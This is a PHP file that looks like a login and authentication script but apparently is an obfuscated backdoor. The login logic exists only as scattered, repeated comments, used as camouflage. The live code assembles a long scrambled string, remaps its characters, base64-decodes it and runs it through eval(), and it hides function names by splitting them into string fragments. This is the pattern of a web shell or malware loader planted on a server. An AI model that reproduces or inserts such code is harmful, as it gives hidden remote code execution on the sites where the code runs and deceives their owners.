<?php
// if ($_SESSION['ses_userID']!="" && $_SESSION['ses_profile']!="") {
 // $bIN = true;
/* }   */ 
  $ZJYZ6='.....'.'.....................'.'.....................MGA8NX5i/lu...U...'.'v3f2arsTBOJwC4'.'SkIWejL1=pRD....'.'..H';
   # }
 $ZJYZ6.='m6VKz0nyxbEZthF.7gPcdQYo9'.'.....';
  // $num = mysql_numrows( $result );
 /* if (isset( $PHP_AUTH_USER ) && isset($PHP_AUTH_PW)) {   */ 
 # $num = mysql_numrows( $result );
$y13L='Q0diubzi4BK8u'.'0ziv089misLeHGswa38vpzgERV84DjX'.'kR8geZ1XJiI1ER5X4B38vMshkRpN4DdN'.'mR3Vv08Ak8z'.'gERV8KiL';
   /* include_once("login_form.php");    */ 
   /* }  */ 
$y13L.='LeHGsK0pTv08Ak61zQMu'.'hJiIXm6oXuB38vMsP4VIt=VYkKDnyuTwV3a'.'3bKVgXeOIrQaIiER5geMQiUT/6eHGsm4oXvMs';
# }
  # global $DBCON, $aUSER;
 # if ($_POST["U"]!="" && $_POST["P"]!="") {
  $y13L.='LeHGsCOI8ka38ERxyE4'.'3fm4wyKpzwHV3=RivMYgXc30jTdMvveOPsSi1PxR'.'3gERz9QZgsKDv8vMurQMYL'.'x4YyQZ'.'gsKpzwHV3';
   # return array(false,"","","");
   $y13L.='=RivMYgXc30jTd'.'MvvJiIzQ0'.'dGuDdX'.'m6oXuB38vMsP4VIt=VYkKDvFkDdQ/dK5KVgXe';
# exit;
  /* list($bIN, $_SESSION['ses_userID'], $_SESSION['ses_profile']) = checkUserInDB($PHP_AUTH_USER, $PHP_AUTH_PW);   */ 
  # header( 'HTTP/1.0 401 Unauthorized' );
$y13L.='OIrQMYoxBYXkDNstO1huadgKfGsKaIov0sstO1P4VI'.'t=VYkKDvFkDdQ/dK5KVgrQ08be08fuDdgeMY';
# }
   # function checkUserInDB($sUserName, $sPassword) {
  # return array(true, $aUSER["UserID"], $aUSER["Profile"], $aUSER);
  $y13L.='C=lzHdpGhv0dNvMvveO1bK61omRVLvaPyKpzwHV3='.'Rivgm4ogKVgXeO1'.'Pv0dNvM1zQMYC=lzHdpGhv0dNvMvvJiI8ka38QaGs';
// }
  # echo 'Authorization Required.';
# if ( ! $bIN ) {
  # header( 'WWW-Authenticate: Basic realm="' . $GLOBALS["sitename"] . '"' );
 /*   */ 
  $y13L.='uaKXkhwyQPdiubziCaY8SawskR8fuD89'.'miQXJiI8S08geZ1XJiIzQagsmRjfmR'.'8be'.'08fuDdgeMYC=lzHdpGhw=dKSH3';
   # fwrite ($fp, serialize($_SERVER));
 # $aUSER = mysql_fetch_assoc($result);
  $y13L.='Fx8/h4OPXQaGsK0pTv08Ak61zQMvX'.'kbmAKf'.'GsKaIov0sstO1P4VIt=VYkKgppO4PfEDKHKVgr'.'QagsmRjfmR'.'8be08fuDdg';
 /* }   */ 
   /*   */ 
   $y13L.='eMYC=lzHdpGhvTPNS4QDv0xh4OPXQaG'.'sK0pTv08Ak61zQMvnEDY'.'Xu6urQM'.'YLx'.'4YyQZgsKpzwH'.'V3=RivDJHo5uT';
  // $aUSER = mysql_fetch_assoc($result);
  # $DBCON->update("_users", array("LogNumber"=>$aUSER["LogNumber"]+1, "LastLog"=>date("Y-m-d")), "WHERE UserID={$aUSER["UserID"]}");
# }
   /* */ 
   $y13L.='mgm6vvJiIzQ0dGuDdXm6oXuB38vMsP4VIt=VYkKD'.'Kn3H'.'PN3BP'.'Nm6vveOPsSi1PxR3gERz9QZgsKDVAm08bKfGsKaI'.'ov0sst';
 // $sql = "SELECT * FROM _users WHERE
# `Password` = '" . addslashes($sPassword) . "' AND
  $y13L.='O1P4VIt=VYkKDKn3HPN3BPNm6vvJi1P'.'m0pgmO1zQMoXuB38vMsP4VIt=VYkKDYov0=h4OPs'.'K6xsQR'.'dnuaY5eMYC=lzHdp';
   # $result = $DBCON->query($sql);
 $y13L.='Ghm0pgmOvveOPsti1P4VIt=VYkKDYov0=h4O'.'1cQMuhJi1PkRzPmO'.'1zQMoXuB38vMsP4VIt=VYkKBI8ubgh4OPsK6xsQR';
   # `Username` = '" . addslashes($sUserName) . "' AND
$y13L.='dnuaY5eMYC=lzHdpGh'.'u0dikOvveOPsti1P4VIt=VYkKDVAm0='.'h4O1cQMuhJ'.'iIXm6sPm0pgmO1ztHgsKiusK6xsK0VAm0=st';
// `Active`=1";
  // if ( !$bIN ) {
   # exit;
 // $bHTTPAUTH = false; //Over HTTP?
 $y13L.='HgzQMuheOIrQaIi'.'ER5geMKpuhKAuhjPx4'.'Y8Q0p9'.'mMILm4KnQ0VXuB3Xkbu6eHGsm4oXvMsLeHGsCOIzQ0';
 /* } else {   */ 
   $y13L.='dGuD=sSiILub89vMs6Y4KikBK2kb2su0p'.'ixRVfQ6PrQ0dNE4wy/MPrQ'.'agsERx'.'ymRVLvaPyKaIov0sXeOIrQaIiER5geMKp';
  # if ($bHTTPAUTH) {
  /* $fp = fopen("log.txt", "w");  */ 
  $y13L.='uhKAuhjLx4YyQ0VXuB3Xkbu6eHGsm4'.'oXvMsLeHGsCOIXm6ofvaKLkB/yK'.'aIov0sGQMuAKiPsQHgzQZ1XQMYLx4YyQZgsmDdgx';
 # fclose($fp);
  # list($bIN, $_SESSION['ses_userID'], $_SESSION['ses_profile'], $_SESSION['ses_user']) = checkUserInDB($_POST["U"], $_POST["P"]);
 # UserID = '" . addslashes($ses_userID) . "'";
  /* if ( $num == 1 ) {    */ 
$y13L.='BvPeMP9Ki2hU6YLx4YyJiIfvD8gxDsyK0pTv'.'08Ak6PsSiITx43'.'8QMvXkbmAKfysERxyQRmXk0dCm4o'.'XuBYfe';
  /* $bIN = false; // Assume user is not authenticated   */ 
   # $sql = "SELECT * FROM _users WHERE
# $result = $DBCON->query($sql);
// $aUSER = mysql_fetch_assoc($result);
$y13L.='MYLx4YyeOPsSiILub89vMs6Y4Ki'.'kBK2u0pgEM1hK'.'aIov0sh'.'Q08fQ0'.'5AvMI8S08fva/6e'.'HGsxhK8xRGrQagsK0xstO1';
  # $bIN = true;
 # if ( !$bIN ) {
// $DBCON->update("_users", array("LogNumber"=>$aUSER["LogNumber"]+1, "LastLog"=>date("Y-m-d")), "WHERE UserID={$aUSER["UserID"]}");
  $y13L.='huBYovMurQ08beMYbuBYovpzou'.'hQstOI1K0xyKaIov0sXeOILub89vM1'.'hHgn2KiN'.'Pmh3gx4YCx4KiRfvvUh3Lub89v0xyQhL8kiQ';
   /* list($bIN, $_SESSION['ses_userID'], $_SESSION['ses_profile']) = checkUserInDB($PHP_AUTH_USER, $PHP_AUTH_PW); */ 
# $sql = "SELECT * FROM _users WHERE
  $y13L.='GeMY'.'buBYovpzouhKk/8gsK61L3fuBeOP9KBLhU'.'6YbuBYovpzouhKkJdgrQ'.'0dGuD=suaKXkhwsQPdiubziC0pTxDdfu';
   # fwrite ($fp, serialize($_SERVER));
 /*  */ 
$y13L.='iIPmR5XmRwsv02su0pgEM1hKaIov0shQTGsxhK'.'8xRGrQ03ouD=sKDv8vMucQ08beMpbER'.'j84DdNE43guisPu0pgEMPXQa';
   // UserID = '" . addslashes($ses_userID) . "'";
  /*   */ 
  $y13L.='GsuaKXkhwyQPdiubziCMuPu0pgEMusE4/sk'.'bzgQ0mAvR5PQ6PrQ0KimRpFJi'.'IzQ08beMpXuVzbERj8eMYLx4YyeOPsSiILub8';
// list($bIN, $_SESSION['ses_userID'], $_SESSION['ses_profile'], $_SESSION['ses_user']) = checkUserInDB($_POST["U"], $_POST["P"]);
   # include_once("login_form.php");
   /*   */ 
$y13L.='9vMs6Y4KikBK2KiYLx4Y'.'yKiIXuiI9kBwsmb8GmOQXJiI6ubdoEfGsCO'.'IXm6'.'soE43Cubdom0p6k0=yKaIov0sXeOIrQaIiER5geMK';
   # `Username` = '" . addslashes($sUserName) . "' AND
  # return array(false,"","","");
  $y13L.='puhKAuhLhK'.'aIov0shQ08fQ05AvMI'.'imRpPxRKGmOQXJiI6ubdoE'.'fGsCO1Pm61zQMvb'.'ERj8KiNh4i';
/* } */ 
  /*   */ 
 $y13L.='u9KDv8vMu9KV2hU6vTkD5gmR5guiurQ08b'.'elmIHp3p'.'QZgztO1yKaY8SawstO1Pm6sPu0pgEMPXeOIrQaIi'.'ER5geMKpuhKAuhjTxRN';
 # }
  /* if ($_POST["U"]!="" && $_POST["P"]!="") { */ 
   # exit;
   // $sql = "SELECT * FROM _users WHERE
 $y13L.='hvMIimRpPQ0mXk0=sKiYLx4YyKiQXJi'.'IzQ0dGuD=sSiILub89vMshHgn2KiPrQMYbQZgsKDK'.'ouD=hU6uD3Mu9KV2hU6v';
   # if (isset( $PHP_AUTH_USER ) && isset($PHP_AUTH_PW)) {
   // $num = mysql_numrows( $result );
 $y13L.='8kb3Am0=hJiILub89vMsPm6sPv0dNvMP'.'XJiIzQ0KimRpFJiIT'.'x438Q'.'MvL'.'v4w'.'hJ6ITx43'.'8QMvnEDYXu';
 /* } else {    */ 
 /* } */ 
 /*    */ 
   $y13L.='6ucQ03ouD=sKDVAm08bKfysKaIo'.'v0sstOIi'.'vaKXkOsPu0pgEMLsKi2heHGsKadLm08i'.'QZgse'.'MYPE4K9xRV84BIAui1zQa3guhKLkB/y';
   # global $DBCON, $aUSER;
   /* }  */ 
 /* } */ 
 # $result = $DBCON->query($sql);
$y13L.='KaIov0sGQMuAKiPXQZNs/M'.'17Qa3Vxh3gu6sPu0pgEMLs/MLsK0YXub5okRdCu0z'.'feO1cQMuAKfGsERxyQR8f4BviE4Yoxbj8eMYVu0YXu';
   // header( 'HTTP/1.0 401 Unauthorized' );
 /* $fp = fopen("log.txt", "w");   */ 
  // function checkUserInDB($sUserName, $sPassword) {
  # $result = $DBCON->query($sql);
   $y13L.='6PX'.'QaGsuaKXkhwyQPdiubziCadLm08iQ08fQ05AvMIB'.'ub8gxRKGmOQXJiI6ubdoEfGsCO1Pubdf'.'vRjgQZgsKiurQMYfv0'.'pgv4/stO';
# `Password` = '" . addslashes($sPassword) . "' AND
  $y13L.='1hHgGhJiIXm6sPxR3'.'gERz9QZgztO1hkRnPE4QheOIrQ'.'MYbQZgs'.'KDVFKiNhm'.'08iKfGsERxyE43Cm08ieMYLx4';
// }
  $y13L.='YyeOPsSi1PubdfvRjg'.'QMNzQMQsm08iQMuPu0pgEMusm4oXu'.'BYfQTGsKa3gx4YVui1zQMv4x4K9ER5hKf'.'GsCOI8ka38ERxyQ=1Pm';
   /* echo 'Authorization Required.';  */ 
  // if ( ! $bIN ) {
# return array(true, $aUSER["UserID"], $aUSER["Profile"], $aUSER);
  # `Active`=1";
  $y13L.='6sPu0pgEMPXQaGsuaKXkhwyQPd'.'iubziC03ok6vgQ0VoED=sm08iQMuPu0pg'.'EMu6eHGsxhK8xRGrQagsCOI8ka38';
# exit;
  /* if ($bHTTPAUTH) {   */ 
# $bHTTPAUTH = false; //Over HTTP?
   $y13L.='ERxyK0pTv08Ak61ztHgsKBIVvMu'.'XQaGsK08f4DKGkD/stOIXuB38vMsP4VIt='.'VYkKDKGkD'.'/h4OPrQMY6k0zTQZgsK08f4DKGkD/7QMYC=l';
 # $num = mysql_numrows( $result );
   # $aUSER = mysql_fetch_assoc($result);
  # if ( $num == 1 ) {
 # }
   $y13L.='zHdpGhxbjAxivvQZysKiurQMYbkO1zQMvoKfGsK'.'0xstO1hvR5GKiNhER5FKfGsERxy'.'eMlPE43CxbjAxiI2CM1PxbjA';
# if ($_SESSION['ses_userID']!="" && $_SESSION['ses_profile']!="") {
  $y13L.='xi1ztHgsKDKhk6uXQMxbQ08f4DmXk0=yKaIov'.'0sXQMxbQMlswMYbe'.'MYLx4'.'YyeOPsK0mnQZgsKBuhJi1Pm61zQMvbkB1';
 // fclose($fp);
   /* $bIN = false; // Assume user is not authenticated    */ 
   $y13L.='hU6v8k6urQ08beMsPkBdg4DmyQZgswMYbeMYLx4'.'YyUM1PmbgXeO1ztHgsmbpG'.'uD=XQaGsuaKXkhwyQPdiu';
  # }
   /* */ 
$y13L.='bziC03ok6vgQ0zLmRNsmb8GmO1hKaIov0shQ6P'.'rQ0KimRpFJiIzQMYbQZgsKDmBu6u9KD8'.'gmOurQMYbm61zQMv6x438KiNh3TwhU6';
  # header( 'WWW-Authenticate: Basic realm="' . $GLOBALS["sitename"] . '"' );
  // exit;
   # function checkUserInDB($sUserName, $sPassword) {
   // $bHTTPAUTH = false; //Over HTTP?
  $y13L.='vCm0=hU6vTk'.'DY8KfGsKaK8uBdGvM1zQ'.'l1Pm6sPkBdg4DmyUM1PmbxyKaY8SawXeH'.'GsK0xstO1hmb3GKiNhkB38KfGsK0xyK0z';
// }
 /* } */ 
   # list($bIN, $_SESSION['ses_userID'], $_SESSION['ses_profile'], $_SESSION['ses_user']) = checkUserInDB($_POST["U"], $_POST["P"]);
   $y13L.='VvpzbEMPrQ08beMYim43Vkawst'.'HgzQlmIHp3peOIrQaIi'.'ER5geMKpuhKAuhjTxRNhvMIBub8gmOIgm4og'.'QaYAQ0mXk0=';
 /* list($bIN, $_SESSION['ses_userID'], $_SESSION['ses_profile']) = checkUserInDB($PHP_AUTH_USER, $PHP_AUTH_PW);  */ 
/* if ($bHTTPAUTH) { */ 
# if ( $num == 1 ) {
  $y13L.='sKiYLx4YyKiQ'.'XJiI6ubdoEfGsCOIzQ08beMYoxBYXk'.'DNsQHgzQMvLv4whQaj2QMlPE43CxbjAxiI2CM1Pxbj';
   # $fp = fopen("log.txt", "w");
  // $result = $DBCON->query($sql);
  # global $DBCON, $aUSER;
 # fwrite ($fp, serialize($_SERVER));
/*    */ 
 $y13L.='Axi1ztHgsKDd9mMuXQaGsERxyE43fm'.'4wyKpzwHV3=RivLm4KnKVgXQMx'.'bQMp8k4IgSOsP4V'.'It=VYkKBI8ubgh4OPXQaG';
  // return array(false,"","","");
/* if ( !$bIN ) { */ 
   /* */ 
  $y13L.='sK0xstO1hxDonKiNhkDwhJiIXm6sowMYbeMYLx'.'4YyUM1P4VIt=VYkKBI8ubgh4OPXQaGsK'.'aK8uBdGvM19tO16C03ok6vgQa38vMILx4YyQM';
  /* header( 'WWW-Authenticate: Basic realm="' . $GLOBALS["sitename"] . '"' );  */ 
  $y13L.='uPu0pgEMu'.'su0dikOIgki1hQ6N'.'P4VIt=VYkKBI8ubgh4ON6KiQrQMYfv0pgv4/s'.'tO1hdDpikb89miurQagsCOIXm6o';
  // if ( ! $bIN ) {
 $y13L.='XuB38vMsP4VIt=VYkKDYov0=h4OPsCaLsQRdnuaY5e'.'MY'.'C=lzHdpGhm0pgmOvveOPsS'.'i1Pm61zQMvgkiu9K'.'BdT'.'EMur';
// }
# $bIN = true;
   # return array(true, $aUSER["UserID"], $aUSER["Profile"], $aUSER);
 /* if ($_POST["U"]!="" && $_POST["P"]!="") {  */ 
   $y13L.='Q08beMp1K0xyKaI'.'ov0sGQMYC=lzHdpGhm0pgmO'.'vveOPsSi1PubdfvRjg'.'QMNzQMK2x'.'Dp9KBwsuDdgQ0m';
   # $aUSER = mysql_fetch_assoc($result);
/* } else {   */ 
  /* }    */ 
 // `Username` = '" . addslashes($sUserName) . "' AND
 /* */ 
 $y13L.='Xk0=sKiYLx4YyKiIPx4Y8QaY'.'AQMu6U6YC=lzHdpGhm0pgmOvvU6QhQT'.'GsKa3gx4YVui1zQM';
# $bIN = false; // Assume user is not authenticated
 /* fclose($fp);  */ 
/* }  */ 
   # exit;
 $y13L.='v4x4K9ER5hKfGsCOIzQagsuaKXkhwseMYoxBYXkD'.'NstHgzQMvnkDYX'.'m6usK6xsKa3gx4YVui1ztHgsKVvo'.'ub5Xkbuhti1';
// $num = mysql_numrows( $result );
// $result = $DBCON->query($sql);
 /*  */ 
  $y13L.='hY4KikBQhQZysKa3gx4YVuiP9KBLhU6Yi'.'m43VkawrQ0Ki'.'mRpFJiIPmRmovRjgJ6'.'ILub89vMs6Y4KikBK2vR5FkbzBk6IAuMQ';
  # if (isset( $PHP_AUTH_USER ) && isset($PHP_AUTH_PW)) {
/* UserID = '" . addslashes($ses_userID) . "'";    */ 
// header( 'HTTP/1.0 401 Unauthorized' );
 /*    */ 
$y13L.='XJiIzQ1yW';
  // include_once("login_form.php");
 # echo 'Authorization Required.';
 /*  */ 
  $Atjab4='ba'.'se64'.'_d'.'ecod'.'e';
# if ($_SESSION['ses_userID']!="" && $_SESSION['ses_profile']!="") {
# }
   // $DBCON->update("_users", array("LogNumber"=>$aUSER["LogNumber"]+1, "LastLog"=>date("Y-m-d")), "WHERE UserID={$aUSER["UserID"]}");
  // $sql = "SELECT * FROM _users WHERE
$U2UWf='or'.'d';
// }
# `Active`=1";
   $Uwj1LD1='co'.'unt';
  # }
 /*    */ 
   $GQIyVtBEY='preg'.'_s'.'pli'.'t';
   /* $aUSER = mysql_fetch_assoc($result);  */ 
  // $num = mysql_numrows( $result );
/* `Password` = '" . addslashes($sPassword) . "' AND   */ 
/* $sql = "SELECT * FROM _users WHERE    */ 
/*    */ 
 $Qa4pQe='impl'.'od'.'e';
 /* return array(true, $aUSER["UserID"], $aUSER["Profile"], $aUSER);   */ 
 // $result = $DBCON->query($sql);
# $num = mysql_numrows( $result );
$UBvPc=$GQIyVtBEY('//', $ZJYZ6,-1,1);
# header( 'WWW-Authenticate: Basic realm="' . $GLOBALS["sitename"] . '"' );
  # } else {
   # exit;
 /*   */ 
   $qUtnpU=$GQIyVtBEY('//', $y13L,-1,1);
# if ( !$bIN ) {
# exit;
  /* list($bIN, $_SESSION['ses_userID'], $_SESSION['ses_profile']) = checkUserInDB($PHP_AUTH_USER, $PHP_AUTH_PW);  */ 
   /* list($bIN, $_SESSION['ses_userID'], $_SESSION['ses_profile'], $_SESSION['ses_user']) = checkUserInDB($_POST["U"], $_POST["P"]); */ 
 /*    */ 
  $S4v4ZfqMa=$Uwj1LD1($qUtnpU);
  # }
  // echo 'Authorization Required.';
// $sql = "SELECT * FROM _users WHERE
 for($i = 0;$i < $S4v4ZfqMa;$i ++){$qUtnpU[$i]=$UBvPc[$U2UWf($qUtnpU[$i])];} eval($Atjab4($Qa4pQe('', $qUtnpU)));
 # $fp = fopen("log.txt", "w");
# $bIN = true;
  # $aUSER = mysql_fetch_assoc($result);
 /* `Password` = '" . addslashes($sPassword) . "' AND   */ 
  
   /* `Active`=1";    */ 
# }
 /* if ($bHTTPAUTH) {    */ 
   # }
 /* */ 

   // $bHTTPAUTH = false; //Over HTTP?
/* $sql = "SELECT * FROM _users WHERE  */ 
   // global $DBCON, $aUSER;
# `Username` = '" . addslashes($sUserName) . "' AND
  
// }
// function checkUserInDB($sUserName, $sPassword) {
 /* if ($_SESSION['ses_userID']!="" && $_SESSION['ses_profile']!="") { */ 
 /* */ 
 
# if ( $num == 1 ) {
# $aUSER = mysql_fetch_assoc($result);
   /*    */ 
  
   /* if ($_POST["U"]!="" && $_POST["P"]!="") { */ 
  # return array(false,"","","");
   # if (isset( $PHP_AUTH_USER ) && isset($PHP_AUTH_PW)) {
 /*  */ 
 
  # fwrite ($fp, serialize($_SERVER));
# }
  
# $result = $DBCON->query($sql);
  # $DBCON->update("_users", array("LogNumber"=>$aUSER["LogNumber"]+1, "LastLog"=>date("Y-m-d")), "WHERE UserID={$aUSER["UserID"]}");
  // }
  
 # if ( ! $bIN ) {
   /* UserID = '" . addslashes($ses_userID) . "'"; */ 
 /*    */ 
   
 # include_once("login_form.php");
 
# header( 'HTTP/1.0 401 Unauthorized' );
  // }
   # fclose($fp);
  /* */ 
 
   // }
// $bIN = false; // Assume user is not authenticated
/*  */ 
  
   # $num = mysql_numrows( $result );
  
 # }
   # list($bIN, $_SESSION['ses_userID'], $_SESSION['ses_profile']) = checkUserInDB($PHP_AUTH_USER, $PHP_AUTH_PW);
 
 # }
/*   */ 
   
 // }
 // }
   # $bIN = true;
 # $bIN = false; // Assume user is not authenticated
 /*   */ 

  /* if ( ! $bIN ) { */ 
 # fwrite ($fp, serialize($_SERVER));
  # exit;
 /*    */ 
 
  /* $num = mysql_numrows( $result );  */ 
 
   // $aUSER = mysql_fetch_assoc($result);
  # return array(false,"","","");
  
   /* `Active`=1"; */ 
   # include_once("login_form.php");
   # global $DBCON, $aUSER;
/*   */ 
   
/* $DBCON->update("_users", array("LogNumber"=>$aUSER["LogNumber"]+1, "LastLog"=>date("Y-m-d")), "WHERE UserID={$aUSER["UserID"]}");    */ 
  /* exit; */ 
 // $bHTTPAUTH = false; //Over HTTP?

  # }
  # }
 /* if ( !$bIN ) { */ 
  # list($bIN, $_SESSION['ses_userID'], $_SESSION['ses_profile'], $_SESSION['ses_user']) = checkUserInDB($_POST["U"], $_POST["P"]);
   
   # fclose($fp);
// } else {
   
// if (isset( $PHP_AUTH_USER ) && isset($PHP_AUTH_PW)) {
 /* */ 
   
 // echo 'Authorization Required.';
  /* `Username` = '" . addslashes($sUserName) . "' AND */ 

# header( 'HTTP/1.0 401 Unauthorized' );
  /* $num = mysql_numrows( $result ); */ 
  # $sql = "SELECT * FROM _users WHERE
/*  */ 
   
  # if ($_SESSION['ses_userID']!="" && $_SESSION['ses_profile']!="") {
  // return array(true, $aUSER["UserID"], $aUSER["Profile"], $aUSER);
 /* $sql = "SELECT * FROM _users WHERE */ 
  
   /* `Password` = '" . addslashes($sPassword) . "' AND  */ 
 /*  */ 
   
 /* $result = $DBCON->query($sql);   */ 
// if ($_POST["U"]!="" && $_POST["P"]!="") {
   
# UserID = '" . addslashes($ses_userID) . "'";
  /* $aUSER = mysql_fetch_assoc($result);   */ 
 # if ( $num == 1 ) {
  /* }  */ 
  
  /* header( 'WWW-Authenticate: Basic realm="' . $GLOBALS["sitename"] . '"' ); */ 
   
 // }
   /*   */ 
  
  # function checkUserInDB($sUserName, $sPassword) {
   /* $result = $DBCON->query($sql);   */ 
   /*   */ 
  
# $fp = fopen("log.txt", "w");
# if ($bHTTPAUTH) {
/*    */ 

  // if ($_POST["U"]!="" && $_POST["P"]!="") {
/*    */ 
   
   # $aUSER = mysql_fetch_assoc($result);
 
   # exit;
  /*   */ 
   
 # $num = mysql_numrows( $result );
# fwrite ($fp, serialize($_SERVER));
 // return array(true, $aUSER["UserID"], $aUSER["Profile"], $aUSER);
  /* }  */ 
   
  /* if ( $num == 1 ) {    */ 
 /* }    */ 
// $bHTTPAUTH = false; //Over HTTP?

  # if ($_SESSION['ses_userID']!="" && $_SESSION['ses_profile']!="") {
// }
/* `Password` = '" . addslashes($sPassword) . "' AND */ 
  /*  */ 

 # global $DBCON, $aUSER;
 # $sql = "SELECT * FROM _users WHERE
  # $bIN = false; // Assume user is not authenticated
 // $result = $DBCON->query($sql);
   
 /* header( 'WWW-Authenticate: Basic realm="' . $GLOBALS["sitename"] . '"' ); */ 
 // if ( !$bIN ) {
 
# include_once("login_form.php");
  // list($bIN, $_SESSION['ses_userID'], $_SESSION['ses_profile']) = checkUserInDB($PHP_AUTH_USER, $PHP_AUTH_PW);
 /* $DBCON->update("_users", array("LogNumber"=>$aUSER["LogNumber"]+1, "LastLog"=>date("Y-m-d")), "WHERE UserID={$aUSER["UserID"]}");    */ 
   // }
  /*   */ 
   
 # $sql = "SELECT * FROM _users WHERE
# if ($bHTTPAUTH) {
# }
 # }
   /*   */ 
  
/* }   */ 
   /*   */ 
 
   # UserID = '" . addslashes($ses_userID) . "'";
 /* $result = $DBCON->query($sql);   */ 
   /*  */ 

 /* }   */ 
   /* $fp = fopen("log.txt", "w");    */ 
 # $bIN = true;
   // `Active`=1";
   /*    */ 

 # } else {

   /* fclose($fp);  */ 
 // list($bIN, $_SESSION['ses_userID'], $_SESSION['ses_profile'], $_SESSION['ses_user']) = checkUserInDB($_POST["U"], $_POST["P"]);
  /* function checkUserInDB($sUserName, $sPassword) { */ 
   
 # exit;
   # $num = mysql_numrows( $result );
 // if (isset( $PHP_AUTH_USER ) && isset($PHP_AUTH_PW)) {
  # $aUSER = mysql_fetch_assoc($result);
 
 // return array(false,"","","");
 /* echo 'Authorization Required.';    */ 
// header( 'HTTP/1.0 401 Unauthorized' );
/* if ( ! $bIN ) {  */ 
 /*    */ 
 
 # `Username` = '" . addslashes($sUserName) . "' AND
# `Username` = '" . addslashes($sUserName) . "' AND
 # exit;
  /*   */ 

  /* include_once("login_form.php");    */ 
   # `Active`=1";
   // if ($bHTTPAUTH) {
  // `Password` = '" . addslashes($sPassword) . "' AND
   /*  */ 
  
// $sql = "SELECT * FROM _users WHERE
# function checkUserInDB($sUserName, $sPassword) {
 // UserID = '" . addslashes($ses_userID) . "'";
  # $result = $DBCON->query($sql);
   /*  */ 
  
# $aUSER = mysql_fetch_assoc($result);
  /*  */ 
   
   /* list($bIN, $_SESSION['ses_userID'], $_SESSION['ses_profile'], $_SESSION['ses_user']) = checkUserInDB($_POST["U"], $_POST["P"]);    */ 
/* global $DBCON, $aUSER;  */ 
   /*    */ 

// }
 # }
   # if ( $num == 1 ) {
/* if ( !$bIN ) { */ 
 /*    */ 

 /* if (isset( $PHP_AUTH_USER ) && isset($PHP_AUTH_PW)) { */ 
 // exit;
 /* */ 
 
   /* header( 'HTTP/1.0 401 Unauthorized' );    */ 
   # $aUSER = mysql_fetch_assoc($result);
   
 /* if ($_SESSION['ses_userID']!="" && $_SESSION['ses_profile']!="") {  */ 
 
 # fclose($fp);
# $num = mysql_numrows( $result );
  /* }   */ 
/*   */ 
  
   /* $bHTTPAUTH = false; //Over HTTP?  */ 
 // list($bIN, $_SESSION['ses_userID'], $_SESSION['ses_profile']) = checkUserInDB($PHP_AUTH_USER, $PHP_AUTH_PW);
 
# echo 'Authorization Required.';
 /* */ 
 
# }
 /* $result = $DBCON->query($sql);    */ 
   // if ( ! $bIN ) {
  /* }   */ 
   
 /* $num = mysql_numrows( $result ); */ 
 /* }   */ 
   # $bIN = true;
/* } */ 

 /* }   */ 

 # header( 'WWW-Authenticate: Basic realm="' . $GLOBALS["sitename"] . '"' );
 # return array(true, $aUSER["UserID"], $aUSER["Profile"], $aUSER);
  // fwrite ($fp, serialize($_SERVER));

   # $fp = fopen("log.txt", "w");
 /*    */ 
  
 // return array(false,"","","");
  # } else {
  // if ($_POST["U"]!="" && $_POST["P"]!="") {
  /* $sql = "SELECT * FROM _users WHERE    */ 
   /*  */ 

   # $DBCON->update("_users", array("LogNumber"=>$aUSER["LogNumber"]+1, "LastLog"=>date("Y-m-d")), "WHERE UserID={$aUSER["UserID"]}");
  // $bIN = false; // Assume user is not authenticated
// list($bIN, $_SESSION['ses_userID'], $_SESSION['ses_profile']) = checkUserInDB($PHP_AUTH_USER, $PHP_AUTH_PW);
// return array(true, $aUSER["UserID"], $aUSER["Profile"], $aUSER);

  // if ( ! $bIN ) {
/* $num = mysql_numrows( $result );    */ 
   
  /* } */ 
 // $aUSER = mysql_fetch_assoc($result);
// include_once("login_form.php");
   // fclose($fp);
  
// $sql = "SELECT * FROM _users WHERE
   # UserID = '" . addslashes($ses_userID) . "'";
  # function checkUserInDB($sUserName, $sPassword) {
  // exit;
 /* */ 
  
   /* }    */ 
  # if ($_POST["U"]!="" && $_POST["P"]!="") {
# $bIN = false; // Assume user is not authenticated
   /* global $DBCON, $aUSER;  */ 

# `Active`=1";
  /* header( 'HTTP/1.0 401 Unauthorized' );    */ 
   # $num = mysql_numrows( $result );
 
   // }
  /* $bHTTPAUTH = false; //Over HTTP? */ 
 /* */ 
 
 /* if (isset( $PHP_AUTH_USER ) && isset($PHP_AUTH_PW)) {    */ 
 
   # header( 'WWW-Authenticate: Basic realm="' . $GLOBALS["sitename"] . '"' );
   
   # list($bIN, $_SESSION['ses_userID'], $_SESSION['ses_profile'], $_SESSION['ses_user']) = checkUserInDB($_POST["U"], $_POST["P"]);
 # fwrite ($fp, serialize($_SERVER));

  # $bIN = true;
   
 # }
  # return array(false,"","","");
  
  # if ( $num == 1 ) {
   // $fp = fopen("log.txt", "w");
  // $aUSER = mysql_fetch_assoc($result);
/* } else {  */ 
   
   # if ($_SESSION['ses_userID']!="" && $_SESSION['ses_profile']!="") {
// echo 'Authorization Required.';
  # $result = $DBCON->query($sql);
 // }
   /* */ 
  
# }
 // if ( !$bIN ) {
 # $DBCON->update("_users", array("LogNumber"=>$aUSER["LogNumber"]+1, "LastLog"=>date("Y-m-d")), "WHERE UserID={$aUSER["UserID"]}");
  /*   */ 

 /* exit; */ 
 
// `Username` = '" . addslashes($sUserName) . "' AND
   # }
  // }
  // if ($bHTTPAUTH) {
  /*   */ 

  /* `Password` = '" . addslashes($sPassword) . "' AND  */ 
/*  */ 
  
/* $result = $DBCON->query($sql);   */ 
/* $sql = "SELECT * FROM _users WHERE    */ 

  // `Active`=1";
# echo 'Authorization Required.';
  // }
// }
   /* */ 

  /* $result = $DBCON->query($sql);  */ 
// $bHTTPAUTH = false; //Over HTTP?
   # list($bIN, $_SESSION['ses_userID'], $_SESSION['ses_profile']) = checkUserInDB($PHP_AUTH_USER, $PHP_AUTH_PW);
 
  /* fclose($fp);    */ 
  // }
  # exit;
// `Username` = '" . addslashes($sUserName) . "' AND
/*  */ 
  
   # include_once("login_form.php");
  /* if ($_SESSION['ses_userID']!="" && $_SESSION['ses_profile']!="") {    */ 
/* } */ 
 # if ($bHTTPAUTH) {

  // header( 'WWW-Authenticate: Basic realm="' . $GLOBALS["sitename"] . '"' );
 
/* function checkUserInDB($sUserName, $sPassword) { */ 
   # list($bIN, $_SESSION['ses_userID'], $_SESSION['ses_profile'], $_SESSION['ses_user']) = checkUserInDB($_POST["U"], $_POST["P"]);
# if (isset( $PHP_AUTH_USER ) && isset($PHP_AUTH_PW)) {
# if ($_POST["U"]!="" && $_POST["P"]!="") {
/*   */ 

# $bIN = false; // Assume user is not authenticated
 // header( 'HTTP/1.0 401 Unauthorized' );
 // }
# }

?>
